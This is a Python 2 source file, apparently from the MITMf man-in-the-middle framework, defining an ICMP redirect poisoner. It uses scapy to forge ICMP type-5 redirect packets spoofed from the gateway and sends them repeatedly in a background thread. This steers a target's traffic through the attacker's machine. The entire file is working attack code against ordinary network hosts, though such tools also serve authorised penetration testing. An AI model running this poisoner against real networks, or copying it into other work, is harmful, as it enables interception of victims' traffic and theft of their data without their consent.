#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import threading
import binascii
import random
#import dns.resolver

from base64 import b64decode
from urllib import unquote
from time import sleep
#from netfilterqueue import NetfilterQueue

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import *

mitmf_logger = logging.getLogger('mitmf')

class ICMPpoisoner():

    def __init__(self, interface, target, gateway, ip_address):

        self.target        = target
        self.gateway       = gateway
        self.interface     = interface
        self.ip_address    = ip_address
        self.debug         = False
        self.send          = True
        self.icmp_interval = 2

    def build_icmp(self):
        pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5, code=1, gw=self.ip_address) /\
              IP(src=self.target, dst=self.gateway)/UDP()

        return pkt

    def start(self):
        pkt = self.build_icmp()

        t = threading.Thread(name='icmp_spoof', target=self.send_icmps, args=(pkt, self.interface, self.debug,))
        t.setDaemon(True)
        t.start()

    def stop(self):
        self.send = False
        sleep(3)

    def send_icmps(self, pkt, interface, debug):
        while self.send:
            sendp(pkt, inter=self.icmp_interval, iface=interface, verbose=debug)
